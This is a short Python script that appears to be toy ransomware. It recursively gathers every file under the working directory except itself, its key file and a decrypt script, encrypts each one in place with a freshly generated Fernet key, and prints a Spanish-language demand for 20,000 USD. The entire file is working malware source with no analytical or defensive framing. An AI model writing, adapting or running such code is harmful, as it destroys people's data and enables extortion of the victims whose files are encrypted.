import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

wd = os.getcwd()
for dirpath, dirnames, filenames in os.walk(wd):
    for file in filenames:
        if file == 'voldemort.py' or file == 'thekey.key' or file == 'decrypt.py':
            continue
        if os.path.isfile(os.path.join(dirpath, file)):
            files.append(os.path.join(dirpath, file))

key = Fernet.generate_key()

with open("thekey.key",  "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Cagaste loco, te encripte todo. O me pasas 20k USD o tus archivos son boleta cuchaste?")
